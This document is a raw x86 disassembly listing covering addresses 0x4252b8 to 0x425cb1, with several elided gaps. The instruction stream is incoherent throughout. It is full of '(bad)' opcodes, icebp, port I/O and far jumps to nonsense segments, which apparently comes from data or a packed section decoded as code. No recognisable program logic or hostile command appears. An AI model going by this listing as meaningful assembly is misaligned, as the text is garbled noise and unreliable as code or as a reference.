  4252b8:	sahf   
  4252b9:	sbb    esp,DWORD PTR [edx]
  4252bb:	stc    
  4252bc:	icebp  
  4252bd:	repnz fdivr QWORD PTR [edi+edi*4-0x204698ed]
  4252c5:	out    dx,al
  4252c6:	(bad)  
  4252c7:	mov    al,ds:0xb6025e33
  4252cc:	inc    ebp
  4252cd:	fstp   DWORD PTR [ebx-0xb]
  4252d0:	and    dh,al
  4252d2:	pop    ebx
  4252d3:	jae    0x42526b
  4252d5:	pop    ebx
  4252d6:	mov    eax,0xabc036c7
  4252db:	jmp    0x320e:0x4cd40599
  4252e2:	ret    0x787
  4252e5:	push   0x8
  4252e7:	xchg   ebx,eax
  4252e8:	xor    eax,0xe48bde55
  4252ed:	jno    0x425287
  4252ef:	retf   
  4252f0:	rcl    bl,cl
  4252f2:	dec    eax
  4252f3:	mov    dl,0xce
  4252f5:	mov    dh,0xb4
  4252f7:	cmp    ecx,DWORD PTR [ebx-0x7c046108]
  4252fd:	mov    eax,0xb5bc1c7f
  425302:	repz icebp 
  425304:	push   esp
  425305:	mov    BYTE PTR [ecx+0x4711fd06],ah
  42530b:	pop    ebp
  42530c:	xchg   BYTE PTR [eax-0x56],al
  42530f:	cmp    eax,DWORD PTR [ebp+ebx*2+0x5d]
  425313:	call   0xeff0:0x502ee182
  42531a:	sub    DWORD PTR [ebp+0x65981438],edx
  425320:	dec    edx
  425321:	scas   al,BYTE PTR es:[edi]
  425322:	gs cmp al,ch
  425325:	or     ebx,esi
  425327:	jl     0x42536e
  425329:	out    0xbe,eax
  42532b:	sahf   
  42532c:	dec    eax
  42532d:	push   ds
  42532e:	adc    dl,0x3
  425331:	shr    al,0x74
  425334:	dec    ecx
  425335:	test   ebx,eax
  425337:	out    0x95,eax
  425339:	and    eax,0xe6f24110
  42533f:	sbb    edx,DWORD PTR [ebx-0x71]
  425342:	pusha  
  425343:	loop   0x42535d
  425345:	mov    ds:0x42372038,eax
  42534a:	stos   BYTE PTR es:[edi],al
  42534b:	push   ecx
  42534c:	cmp    al,0x3d
  42534e:	pushf  
  42534f:	lods   al,BYTE PTR ds:[esi]
  425350:	and    dl,BYTE PTR [edx]
  425352:	sbb    ch,BYTE PTR [ebx-0x52]
  425355:	mov    ah,0x95
  425357:	fdiv   st,st(0)
  425359:	jle    0x425341
  42535b:	pop    ecx
  42535c:	fadd   QWORD PTR [edx+0x2a9eec9c]
  425362:	mov    ah,ah
  425364:	mov    esp,DWORD PTR [eax+0x1e]
  425367:	fadd   QWORD PTR [edx]
  425369:	sub    BYTE PTR [ebp+0x1c3ccd21],dh
  42536f:	jno    0x4253b7
  425371:	push   eax
  425372:	je     0x4253b5
  425374:	fdivrp st(2),st
  425376:	out    dx,al
  425377:	or     ebp,DWORD PTR [edi]
  425379:	mov    al,ds:0x32a8f184
  42537e:	cmp    DWORD PTR [edi-0x7b],ebp
  425381:	dec    BYTE PTR [esi]
  425383:	jp     0x42531d
  425385:	cmp    bh,BYTE PTR [ecx+0x6d]
  425388:	cli    
  425389:	dec    ebx
  42538a:	pop    edx
  42538b:	scas   eax,DWORD PTR es:[edi]
  42538c:	outs   dx,BYTE PTR ds:[esi]
  42538d:	xor    DWORD PTR [edx-0x335fec1e],ebx
  425393:	out    0x38,al
  425395:	sar    DWORD PTR [edx*2+0x161de6c1],1
  42539c:	sub    esp,DWORD PTR [ebp-0x2e23ec3]
  4253a2:	adc    eax,0x37cf4dba
  4253a7:	bound  eax,QWORD PTR [edx]
  4253a9:	mov    edx,DWORD PTR [ebx]
  4253ab:	sbb    ch,BYTE PTR [ecx]
  4253ad:	mov    al,ds:0xf5971857
  4253b2:	or     al,0x88
  4253b4:	inc    eax
	...
  425415:	add    BYTE PTR [edx+0x9],al
  425418:	les    ebp,FWORD PTR [ecx-0x14901231]
  42541e:	out    0xf4,eax
  425420:	xchg   al,bl
  425422:	loopne 0x425458
  425424:	xor    eax,0x18cfc51
  425429:	add    BYTE PTR [edi],al
  42542b:	add    DWORD PTR [eax],eax
  42542d:	add    BYTE PTR [ecx],cl
  42542f:	lods   eax,DWORD PTR ds:[esi]
  425430:	loop   0x42545a
  425432:	add    eax,0x8ca48c0b
  425437:	scas   eax,DWORD PTR es:[edi]
  425438:	pop    ebx
  425439:	and    eax,0xc057293
  42543e:	and    eax,0x4823166e
  425443:	rcr    ecx,cl
  425445:	inc    eax
  425446:	or     al,0x93
  425448:	and    ecx,DWORD PTR [esi]
  42544a:	and    esi,ecx
  42544c:	cmp    al,0xa4
  42544e:	pusha  
  42544f:	cs hlt 
  425451:	(bad)  
  425452:	std    
  425453:	jmp    0x6eec:0x45a16722
  42545a:	inc    eax
  42545b:	stos   DWORD PTR es:[edi],eax
  42545c:	ds inc esp
  42545e:	aaa    
  42545f:	fidivr DWORD PTR [esi]
  425461:	add    BYTE PTR [esi+edx*1],0xf3
  425465:	out    dx,al
  425466:	mov    fs,WORD PTR [edi-0x425b858b]
  42546c:	inc    eax
  42546d:	mov    WORD PTR [ebp+0x64],gs
  425470:	ja     0x425449
  425472:	ret    
  425473:	fcmovnb st,st(3)
  425475:	add    edi,DWORD PTR [ebx+0x29]
  425478:	push   esp
  425479:	mov    ebp,0xfff72c98
  42547e:	retf   
  42547f:	jge    0x4254aa
  425481:	and    al,BYTE PTR [eax+0x4dad8618]
  425487:	fist   WORD PTR [edx-0x7b1ed81e]
  42548d:	ret    
  42548e:	mov    ds:0x676ec1a,al
  425493:	sbb    al,BYTE PTR ds:[eax+ebp*1-0x25]
  425498:	mov    ebx,0x8e7ac78f
  42549d:	ret    0xea8e
  4254a0:	ror    BYTE PTR [ecx],cl
  4254a2:	xor    esi,DWORD PTR [eax+esi*8-0x2b11812b]
  4254a9:	aam    0x38
  4254ab:	test   ebp,0xd36c8d24
  4254b1:	lahf   
  4254b2:	cmp    ch,bh
  4254b4:	jp     0x425517
  4254b6:	aaa    
  4254b7:	add    cl,BYTE PTR [esi-0x3447df38]
  4254bd:	mov    ebx,0xc6c47876
  4254c2:	ins    BYTE PTR es:[edi],dx
  4254c3:	mov    ch,0xac
  4254c5:	jo     0x425528
  4254c7:	and    bh,BYTE PTR [ebx+ebp*1-0x4d0bce81]
  4254ce:	inc    eax
  4254cf:	das    
  4254d0:	cs and ch,0xf5
  4254d4:	add    dh,BYTE PTR [ebx]
  4254d6:	cmc    
  4254d7:	cmp    BYTE PTR [edx+0x60],dh
  4254da:	add    edx,DWORD PTR [ecx-0x8c9c23f]
  4254e0:	ss repz sti 
  4254e3:	cmp    BYTE PTR [esi],0x62
  4254e6:	dec    edx
  4254e7:	mov    ecx,0xfdb98695
  4254ec:	scas   eax,DWORD PTR es:[edi]
  4254ed:	(bad)  
  4254ee:	out    dx,al
  4254ef:	adc    al,0x91
  4254f1:	pop    ss
  4254f2:	popf   
  4254f3:	inc    esp
  4254f4:	sub    BYTE PTR [ebx-0x3d],al
  4254f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4254f8:	or     edi,edi
  4254fa:	je     0x4254eb
  4254fc:	mov    bl,0xb5
  4254fe:	or     eax,0xa8e3f1f7
  425503:	ins    BYTE PTR es:[edi],dx
  425504:	mov    edi,0x1ec81da6
  425509:	cmp    BYTE PTR [esi+0x2c118c61],ah
  42550f:	or     eax,0xd24918e0
  425514:	cs add al,0x3a
  425517:	aam    0x2d
  425519:	add    eax,0x611140f3
  42551e:	fbld   TBYTE PTR [ecx-0x7]
  425521:	sti    
  425522:	xor    DWORD PTR [ebx],ebp
  425524:	lods   eax,DWORD PTR ds:[esi]
  425525:	cmp    al,BYTE PTR [ebx-0x38a97532]
  42552b:	sbb    eax,0xa1a7e05f
  425530:	inc    ecx
  425531:	xor    DWORD PTR [ecx],0xaf05
	...
  425593:	add    BYTE PTR [eax],al
  425595:	add    ah,al
  425597:	jmp    0xfef4:0xfe6e7a4e
  42559e:	dec    esp
  42559f:	push   ecx
  4255a0:	ret    0xbdc6
  4255a3:	outs   dx,BYTE PTR ds:[esi]
  4255a4:	imul   edx,DWORD PTR [esi+0x18e03],0x7
  4255ab:	add    DWORD PTR [eax],eax
  4255ad:	add    BYTE PTR [eax+0x5fcea861],cl
  4255b3:	xchg   DWORD PTR [edx-0x4b],ebx
  4255b6:	jo     0x425616
  4255b8:	frstor ds:0x959a7c4a
  4255be:	mov    esi,0x5c89bf36
  4255c3:	lods   al,BYTE PTR ds:[esi]
  4255c4:	outs   dx,DWORD PTR ds:[esi]
  4255c5:	or     BYTE PTR [ecx-0x79],dl
  4255c8:	mov    edi,0xf739014a
  4255cd:	jg     0x4255fc
  4255cf:	ud2    
  4255d1:	pop    edx
  4255d2:	mov    al,BYTE PTR [esi-0xf]
  4255d5:	arpl   di,cx
  4255d7:	jg     0x42556a
  4255d9:	add    eax,0xfd6cdc5a
  4255de:	pop    es
  4255df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255e0:	mov    al,ds:0x601243b7
  4255e5:	inc    eax
  4255e6:	test   ebp,esp
  4255e8:	mov    dh,0x9a
  4255ea:	pop    ds
  4255eb:	fs retf 
  4255ed:	pop    eax
  4255ee:	add    BYTE PTR [esi+0x212c1766],bl
  4255f4:	mov    dl,0x89
  4255f6:	lock dec edx
  4255f8:	xchg   ebx,eax
  4255f9:	adc    al,0x81
  4255fb:	shl    BYTE PTR [ebp+0x1b6d69c0],cl
  425601:	hlt    
  425602:	mov    BYTE PTR [esp+ebx*8-0x21cc5348],dh
  425609:	lahf   
  42560a:	and    DWORD PTR [esi],ecx
  42560c:	xchg   cl,ch
  42560e:	imul   ebx,DWORD PTR [edi],0xea35e4e8
  425614:	inc    esi
  425615:	dec    edi
  425616:	push   ss
  425617:	dec    ebp
  425618:	outs   dx,DWORD PTR ds:[esi]
  425619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42561a:	push   es
  42561b:	xor    cl,ch
  42561d:	jmp    0xd3193726
  425622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425623:	pop    es
  425624:	pop    ebx
  425625:	adc    al,0xcb
  425627:	icebp  
  425628:	out    dx,eax
  425629:	dec    edi
  42562a:	lahf   
  42562b:	dec    esi
  42562c:	fstp   TBYTE PTR [ebx+0x5e890fac]
  425632:	cdq    
  425633:	repz out 0x89,al
  425636:	adc    al,bl
  425638:	dec    esi
  425639:	loopne 0x4255d8
  42563b:	push   ds
  42563c:	jmp    0x45cd:0x7a7833f6
  425643:	call   0x1f17:0xe7196e02
  42564a:	in     al,0x4d
  42564c:	mov    DWORD PTR [ecx],ecx
  42564e:	lock js 0x425688
  425651:	in     al,dx
  425652:	pop    edx
  425653:	cmp    bl,dh
  425655:	fwait
  425656:	(bad)  
  425657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425658:	loop   0x4256b4
  42565a:	adc    ecx,DWORD PTR [edx-0x2d]
  42565d:	icebp  
  42565e:	icebp  
  42565f:	mov    dh,0x43
  425661:	cld    
  425662:	dec    edx
  425663:	inc    ebx
  425664:	ret    
  425665:	mov    dl,0x5b
  425667:	pushf  
  425668:	mov    ds:0x3982d966,eax
  42566d:	inc    ebx
  42566e:	imul   esp,DWORD PTR [edi+0x49b7dc09],0x2e9bda0f
  425678:	arpl   si,ax
  42567a:	mov    ds:0x84f2720e,eax
  42567f:	mov    eax,0xa0ce74ca
  425684:	scas   eax,DWORD PTR es:[edi]
  425685:	mov    eax,0x2b20c5cc
  42568a:	sbb    BYTE PTR [eax],ah
  42568c:	cs test ebp,ebp
  42568f:	(bad)  
  425691:	frstor [ebp+0x77]
  425694:	dec    ebx
  425695:	fsub   st(2),st
  425697:	cs (bad) 
  42569a:	mov    ecx,0xd8dcb115
  42569f:	sti    
  4256a0:	sbb    bl,BYTE PTR [eax-0x4ed2b80f]
  4256a6:	leave  
  4256a7:	iret   
  4256a8:	scas   al,BYTE PTR es:[edi]
  4256a9:	(bad)  
  4256aa:	mov    cl,bh
  4256ac:	mov    dh,0xbe
  4256ae:	add    ch,BYTE PTR ds:0xa6cf1d2d
  4256b4:	push   edi
	...
  425715:	add    dh,dl
  425717:	aaa    
  425718:	shl    BYTE PTR [ebx+esi*8],cl
  42571b:	cmc    
  42571c:	div    bh
  42571e:	mov    dl,0x28
  425720:	shr    DWORD PTR [ebx-0x5997877d],cl
  425726:	or     cl,BYTE PTR [edi+0x1070001]
  42572c:	add    BYTE PTR [eax],al
  42572e:	and    al,0x94
  425730:	in     eax,0x32
  425732:	xchg   edx,eax
  425733:	repnz adc al,0x8c
  425736:	rcr    DWORD PTR [eax-0x5877c67c],1
  42573c:	pop    esi
  42573d:	adc    BYTE PTR [ecx],0xcd
  425740:	add    ebx,DWORD PTR [edi+0x1c]
  425743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425744:	sbb    dl,BYTE PTR [edi+0x57d1bcda]
  42574a:	or     ch,BYTE PTR [eax-0x2b43f38c]
  425750:	imul   esp,DWORD PTR [ebx+0x23],0x37
  425754:	push   ebp
  425755:	aas    
  425756:	cmp    BYTE PTR fs:[ebp+0x79],al
  42575a:	pop    esi
  42575b:	aam    0xe4
  42575d:	push   ss
  42575e:	into   
  42575f:	mov    eax,fs:0xd73c3450
  425765:	rcl    DWORD PTR [ecx+0x48],0x6a
  425769:	stos   BYTE PTR es:[edi],al
  42576a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42576b:	cli    
  42576c:	cmp    BYTE PTR [edx],0x60
  42576f:	in     eax,0x60
  425771:	rcl    cl,1
  425773:	mov    ecx,0x7bf724e0
  425778:	retf   0x668e
  42577b:	js     0x425745
  42577d:	mov    ah,0xd6
  42577f:	jmp    0x4df6a109
  425784:	mov    bh,0x11
  425786:	dec    esp
  425787:	or     cl,BYTE PTR [edi]
  425789:	into   
  42578a:	imul   esp,DWORD PTR [eax+0x38632ed3],0xffffff97
  425791:	push   ss
  425792:	cmp    al,0xde
  425794:	add    ebp,ebp
  425796:	arpl   WORD PTR [ebp+0x3f],si
  425799:	mov    dl,0xdf
  42579b:	xchg   DWORD PTR [ebp-0x7e],esi
  42579e:	sub    ebp,ebx
  4257a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257a1:	inc    ebx
  4257a2:	push   edi
  4257a3:	aad    0x6c
  4257a5:	mov    al,ds:0xf859b130
  4257aa:	sub    bh,BYTE PTR [ebx+eax*1+0x1c]
  4257ae:	es pop edx
  4257b0:	jecxz  0x42576b
  4257b2:	scas   eax,DWORD PTR es:[edi]
  4257b3:	sar    BYTE PTR [ebp+edi*4+0xb],0x50
  4257b8:	sbb    al,0x4b
  4257ba:	xlat   BYTE PTR ds:[ebx]
  4257bb:	aam    0xbd
  4257bd:	and    eax,0x609ba01b
  4257c2:	sti    
  4257c3:	add    al,0x41
  4257c5:	adc    DWORD PTR [edx-0x5d],esi
  4257c8:	inc    ebp
  4257c9:	je     0x425771
  4257cb:	test   BYTE PTR [ecx],dh
  4257cd:	jecxz  0x42575f
  4257cf:	stos   DWORD PTR es:[edi],eax
  4257d0:	(bad)  
  4257d1:	sbb    DWORD PTR [ebx-0x127a4bce],edx
  4257d7:	push   es
  4257d8:	sbb    DWORD PTR [ebp-0x1474d22],edx
  4257de:	cmp    BYTE PTR [esp+ebp*4+0x73764461],dh
  4257e5:	mov    al,0xd
  4257e7:	push   eax
  4257e8:	xchg   ebp,eax
  4257e9:	mov    ebx,0x6922e873
  4257ee:	bound  eax,QWORD PTR [edx-0xeb0e25b]
  4257f4:	jb     0x4257f5
  4257f6:	std    
  4257f7:	and    al,0x43
  4257f9:	fsub   QWORD PTR [eax-0x3c]
  4257fc:	mov    ah,0xad
  4257fe:	ret    0x96f7
  425801:	dec    esp
  425802:	mov    ds:0xf7b62cd0,al
  425807:	popa   
  425808:	(bad)  
  425809:	sub    eax,0x36fe4563
  42580e:	ins    BYTE PTR es:[edi],dx
  42580f:	pop    eax
  425810:	add    BYTE PTR [edx+ebp*2],ah
  425813:	jge    0x42585f
  425815:	test   eax,0xc2e80b6e
  42581a:	or     eax,0xc500c9c8
  42581f:	repz mov ecx,DWORD PTR [eax+0x30]
  425823:	out    dx,al
  425824:	xchg   ecx,eax
  425825:	sbb    al,0x51
  425827:	nop
  425828:	cmp    eax,0x2581e60b
  42582d:	pop    ss
  42582e:	pop    esp
  42582f:	rcl    BYTE PTR [eax+0x32],cl
  425832:	pop    esi
  425833:	adc    DWORD PTR [edi+0x0],edx
	...
  425895:	add    BYTE PTR [edx+edx*2-0x70],bl
  425899:	push   edx
  42589a:	sahf   
  42589b:	rcr    dh,cl
  42589d:	pop    esi
  42589e:	inc    eax
  42589f:	scas   eax,DWORD PTR es:[edi]
  4258a0:	stc    
  4258a1:	mov    ds:0x494c66dc,al
  4258a6:	adc    DWORD PTR [eax+0x1070001],edx
  4258ac:	add    BYTE PTR [eax],al
  4258ae:	adc    edi,edx
  4258b0:	and    DWORD PTR [esi+0x1e67a7a],esi
  4258b6:	cmp    DWORD PTR [edi+0x34543411],eax
  4258bc:	or     BYTE PTR [ecx+0x4],dl
  4258bf:	mov    ebp,DWORD PTR [ecx]
  4258c1:	mov    al,0x58
  4258c3:	pop    ebx
  4258c4:	lahf   
  4258c5:	xor    BYTE PTR [ecx],dh
  4258c7:	ret    0x8100
  4258ca:	sbb    dh,0xc3
  4258cd:	jb     0x42586a
  4258cf:	lods   al,BYTE PTR ds:[esi]
  4258d0:	push   cs
  4258d1:	mov    ch,0xac
  4258d3:	ficomp DWORD PTR [ecx+0x65]
  4258d6:	jl     0x4258b8
  4258d8:	loop   0x4258f5
  4258da:	cmp    eax,DWORD PTR [ecx+esi*1+0x75]
  4258de:	add    ah,ch
  4258e0:	call   0x248:0xf97491a
  4258e7:	inc    ebp
  4258e8:	add    BYTE PTR [esi+0x67],ch
  4258eb:	fcmove st,st(5)
  4258ed:	push   eax
  4258ee:	jne    0x425902
  4258f0:	and    al,0x50
  4258f2:	sbb    DWORD PTR [ebp+0x630dc45],edi
  4258f8:	fld    QWORD PTR [edi+esi*2-0x4e]
  4258fc:	bound  esi,QWORD PTR [eax+0x3212be54]
  425902:	addr16 (bad) 
  425904:	cmc    
  425905:	aas    
  425906:	icebp  
  425907:	gs xchg bh,al
  42590a:	push   ebp
  42590b:	dec    esp
  42590c:	inc    esp
  42590d:	daa    
  42590e:	retf   
  42590f:	inc    esi
  425910:	rcr    DWORD PTR [esi],cl
  425912:	fld    TBYTE PTR [ebp-0x10]
  425915:	jns    0x42590e
  425917:	shl    BYTE PTR [ebx+eiz*1+0x3],0xaa
  42591c:	pop    edx
  42591d:	popf   
  42591e:	and    ebp,ebx
  425920:	repz pop eax
  425922:	cmp    ecx,edi
  425924:	dec    ecx
  425925:	cdq    
  425926:	mov    eax,esi
  425928:	test   BYTE PTR [ebp-0x46],bl
  42592b:	or     dl,dl
  42592d:	outs   dx,BYTE PTR ds:[esi]
  42592e:	clc    
  42592f:	adc    DWORD PTR [esi+ecx*1+0x5dbffcf1],esp
  425936:	sub    DWORD PTR [ebp+0x766151be],eax
  42593c:	aas    
  42593d:	iret   
  42593e:	int3   
  42593f:	push   ss
  425940:	jno    0x42596a
  425942:	pop    eax
  425943:	into   
  425944:	je     0x425901
  425946:	das    
  425947:	cmp    edx,DWORD PTR [eax]
  425949:	hlt    
  42594a:	push   ds
  42594b:	rcl    DWORD PTR [esi+0x710fbea1],cl
  425951:	mov    edx,0x9e8d1d7
  425956:	iret   
  425957:	fild   WORD PTR [ebx+0x4d]
  42595a:	add    BYTE PTR [ebx],0x16
  42595d:	je     0x425918
  42595f:	fadd   DWORD PTR [edi-0x70c45b64]
  425965:	mov    ebp,0xcac614f4
  42596a:	inc    ebx
  42596b:	sub    esp,ecx
  42596d:	inc    ebx
  42596e:	fcom   DWORD PTR [ebx-0x37]
  425971:	add    DWORD PTR [ebp-0x6c],ebx
  425974:	mov    ebx,DWORD PTR [eax+eiz*4+0x10d8cfcb]
  42597b:	push   edi
  42597c:	(bad)  
  42597d:	aad    0x7e
  42597f:	(bad)  
  425980:	and    al,0xec
  425982:	sti    
  425983:	sbb    al,0x64
  425985:	xor    ebx,DWORD PTR [edi]
  425987:	sbb    eax,0xbfc06e2a
  42598c:	mov    dh,0x1d
  42598e:	pop    es
  42598f:	xor    esp,DWORD PTR [ecx-0x5b]
  425992:	push   esp
  425993:	jp     0x425942
  425995:	(bad)  
  425996:	(bad)  
  425997:	daa    
  425998:	mov    edi,edx
  42599a:	mov    dl,0x7d
  42599c:	mul    DWORD PTR [edx+edx*4+0xe]
  4259a0:	(bad)  [ebp-0x5246e74b]
  4259a6:	xchg   esp,eax
  4259a7:	div    DWORD PTR [edx+0x473187c5]
  4259ad:	mov    ecx,DWORD PTR [ecx]
  4259af:	sbb    DWORD PTR [ecx],ebx
  4259b1:	inc    esi
  4259b2:	arpl   bx,di
  4259b4:	sbb    eax,DWORD PTR [eax]
	...
  425a16:	shl    DWORD PTR [ebx+0x4],0x67
  425a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1b:	jcxz   0x425a05
  425a1e:	mov    edi,0x1f81fe11
  425a24:	xor    eax,0x1911844
  425a29:	add    BYTE PTR [edi],al
  425a2b:	add    DWORD PTR [eax],eax
  425a2d:	add    ch,dh
  425a2f:	fwait
  425a30:	mov    bl,0x33
  425a32:	arpl   si,bp
  425a34:	mov    WORD PTR [ebp-0x48],?
  425a37:	cwde   
  425a38:	and    al,0x30
  425a3a:	repz es int 0xb6
  425a3e:	js     0x425a60
  425a40:	fcmovne st,st(5)
  425a42:	fisub  DWORD PTR [ebp-0x9]
  425a45:	lods   al,BYTE PTR ds:[esi]
  425a46:	scas   eax,DWORD PTR es:[edi]
  425a47:	xlat   BYTE PTR ds:[ebx]
  425a48:	cmc    
  425a49:	mov    WORD PTR [ecx],?
  425a4b:	or     DWORD PTR [ebx-0x68fe997d],0x6305f811
  425a55:	daa    
  425a56:	(bad)  
  425a57:	sub    ebx,DWORD PTR [esi-0x46]
  425a5a:	sub    bl,bh
  425a5c:	test   al,0xc5
  425a5e:	or     eax,0x3b814e0c
  425a63:	push   ecx
  425a64:	inc    ecx
  425a65:	xchg   bx,ax
  425a67:	das    
  425a68:	xchg   ebx,eax
  425a69:	(bad)  
  425a6a:	pop    ecx
  425a6b:	sub    DWORD PTR [edx+0x7799807a],ecx
  425a71:	lahf   
  425a72:	pop    es
  425a73:	rcr    BYTE PTR [edx-0x7399e075],0x24
  425a7a:	mov    BYTE PTR [edi],dl
  425a7c:	jo     0x425a51
  425a7e:	test   DWORD PTR [ecx+0x50],0xabdf7b20
  425a85:	int3   
  425a86:	lods   al,BYTE PTR ds:[esi]
  425a87:	sbb    eax,0x28ab6e2c
  425a8c:	pop    esi
  425a8d:	mov    ebx,0x7145cb98
  425a92:	sub    eax,0x970c143e
  425a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a98:	inc    ebx
  425a99:	out    0x8c,eax
  425a9b:	add    ecx,DWORD PTR [edi-0x1e]
  425a9e:	inc    edx
  425a9f:	fist   WORD PTR [edx+0x42]
  425aa2:	(bad)  [edi-0x7d]
  425aa5:	cld    
  425aa6:	xor    BYTE PTR [eax+0x4f],al
  425aa9:	jp     0x425a87
  425aab:	test   BYTE PTR [esi-0x39],dl
  425aae:	ss loop 0x425a39
  425ab1:	clc    
  425ab2:	mov    WORD PTR [ecx+0xc],?
  425ab5:	mov    esi,0xf9707c91
  425aba:	fbld   TBYTE PTR [ebx+0x9]
  425abd:	call   0x471d:0x69060a0e
  425ac4:	dec    eax
  425ac5:	imul   esp,DWORD PTR [edi],0xffffffc1
  425ac8:	pop    ecx
  425ac9:	leave  
  425aca:	xor    al,0xae
  425acc:	arpl   WORD PTR [ecx+0x11],dx
  425acf:	cmp    eax,0x831f6d37
  425ad4:	es sub ch,bl
  425ad7:	paddusb mm1,QWORD PTR [ebp-0x6e]
  425adb:	sub    bl,BYTE PTR [edx]
  425add:	and    BYTE PTR [esi],bh
  425adf:	mov    WORD PTR [ebx+0x1a97a8eb],gs
  425ae5:	mov    bh,0xf1
  425ae7:	push   esp
  425ae8:	imul   esp,DWORD PTR [edx+0x760f1793],0x24
  425aef:	in     eax,dx
  425af0:	pusha  
  425af1:	mov    ds:0x689a875,al
  425af6:	cmp    BYTE PTR [esp+eax*1],ah
  425af9:	dec    esp
  425afa:	retf   0x394d
  425afd:	and    BYTE PTR [edi+0x7a9064f],al
  425b03:	sbb    DWORD PTR [ebp+0x4847ac25],0xed8eaa67
  425b0d:	ret    0x3f77
  425b10:	arpl   cx,ax
  425b12:	fstp   DWORD PTR [ecx+0x76]
  425b15:	push   ecx
  425b16:	mov    ah,0xe8
  425b18:	xor    esp,esp
  425b1a:	mov    bh,0x39
  425b1c:	(bad)  [ecx-0x13f1cdc1]
  425b22:	mov    esi,0x52bbce9e
  425b27:	pop    es
  425b28:	and    al,0x6f
  425b2a:	mov    esi,DWORD PTR [ecx+0xc1e6c6]
  425b30:	and    dh,ah
  425b32:	xchg   ecx,edx
  425b34:	stos   BYTE PTR es:[edi],al
	...
  425b95:	add    ah,al
  425b97:	clc    
  425b98:	jnp    0x425bf0
  425b9a:	jg     0x425b73
  425b9c:	in     eax,dx
  425b9d:	cli    
  425b9e:	push   0x19a5aad3
  425ba3:	shr    cl,0xe9
  425ba6:	pop    ds
  425ba7:	xchg   edx,eax
  425ba8:	add    DWORD PTR [eax],eax
  425baa:	pop    es
  425bab:	add    DWORD PTR [eax],eax
  425bad:	add    al,dl
  425baf:	push   ebp
  425bb0:	inc    esi
  425bb1:	xchg   edi,eax
  425bb2:	adc    al,0x39
  425bb4:	pop    esp
  425bb5:	loope  0x425c2a
  425bb7:	dec    esp
  425bb8:	sub    edi,edi
  425bba:	xor    bh,dl
  425bbc:	jmp    0xd002:0xa096dff7
  425bc3:	pop    edi
  425bc4:	sub    edi,esi
  425bc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bc7:	inc    ebx
  425bc8:	loopne 0x425c3d
  425bca:	inc    edi
  425bcb:	(bad)  
  425bcc:	fidivr DWORD PTR [eax-0x5d]
  425bcf:	push   eax
  425bd0:	adc    edx,DWORD PTR [edi]
  425bd2:	fisttp WORD PTR [eax-0x17]
  425bd5:	mov    edi,0x4b16ce9
  425bda:	mov    es,WORD PTR [edx+0x4fa9ed98]
  425be0:	pop    ebp
  425be1:	add    DWORD PTR [ecx],eax
  425be3:	xlat   BYTE PTR ds:[ebx]
  425be4:	add    DWORD PTR [edi-0x34],0x4fd79b73
  425beb:	xchg   edx,eax
  425bec:	mov    eax,ds:0x739fe27f
  425bf1:	repz dec ebp
  425bf3:	dec    edx
  425bf4:	mov    ebp,0x38105be0
  425bf9:	jae    0x425c1b
  425bfb:	outs   dx,DWORD PTR ds:[esi]
  425bfc:	xlat   BYTE PTR ds:[ebx]
  425bfd:	push   esi
  425bfe:	leave  
  425bff:	dec    edi
  425c00:	leave  
  425c01:	cwde   
  425c02:	dec    ebp
  425c03:	mov    edx,0x50162b8f
  425c08:	inc    eax
  425c09:	push   edi
  425c0a:	iret   
  425c0b:	sahf   
  425c0c:	jbe    0x425c2f
  425c0e:	fdiv   DWORD PTR [ebp+0x4913c7e5]
  425c14:	sub    esp,edx
  425c16:	fstp   DWORD PTR [ebx-0x1095d7ac]
  425c1c:	fcomp  DWORD PTR [edi]
  425c1e:	ins    DWORD PTR es:[edi],dx
  425c1f:	shl    DWORD PTR [edx-0x50f0b3d8],1
  425c25:	dec    ecx
  425c26:	mov    ah,0x7
  425c28:	pop    es
  425c29:	sub    DWORD PTR [ebp-0x7dd74d46],eax
  425c2f:	adc    BYTE PTR [ecx-0x4e],0x92
  425c33:	mov    BYTE PTR [ebx+0x4c],al
  425c36:	xchg   edi,eax
  425c37:	inc    ebx
  425c38:	mov    cl,0xa7
  425c3a:	sbb    eax,eax
  425c3c:	push   eax
  425c3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c3e:	sbb    edx,DWORD PTR [eax+0x1d693fcc]
  425c44:	inc    esi
  425c45:	ja     0x425bd1
  425c47:	cmp    BYTE PTR [ebp+0xc6d16ca],ah
  425c4d:	rcl    BYTE PTR [ebx-0x11],cl
  425c50:	dec    esi
  425c51:	call   esp
  425c53:	mov    eax,0x275ff10a
  425c58:	sbb    BYTE PTR [eax+0x60],ch
  425c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c5c:	scas   eax,DWORD PTR es:[edi]
  425c5d:	sbb    al,dl
  425c5f:	(bad)
  425c63:	lahf   
  425c64:	jbe    0x425cc3
  425c66:	dec    ebx
  425c67:	bound  esi,QWORD PTR [ecx+0x470494b2]
  425c6d:	repz cs mov bh,0x73
  425c71:	mov    cl,0x11
  425c73:	(bad)  
  425c74:	push   esp
  425c75:	sbb    al,0xe5
  425c77:	(bad)  
  425c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c79:	mov    ebp,0x5b103089
  425c7e:	rcr    DWORD PTR [edx+edx*1+0x68dc99ad],cl
  425c85:	add    eax,0x26aa8cb2
  425c8a:	fisubr DWORD PTR ss:[ebx-0x24]
  425c8e:	lahf   
  425c8f:	ret    
  425c90:	mov    dl,0xf8
  425c92:	dec    eax
  425c93:	test   BYTE PTR [ebp-0x4d],cl
  425c96:	js     0x425cd5
  425c98:	stc    
  425c99:	in     al,0xe0
  425c9b:	je     0x425caa
  425c9d:	cmp    al,BYTE PTR [ebp-0x6940ee7c]
  425ca3:	mov    eax,ds:0x48e11063
  425ca8:	mov    dh,0x73
  425caa:	dec    cx
  425cac:	push   ds
  425cad:	data16 sbb bh,ah
  425cb0:	stc    
  425cb1:	push   ebx
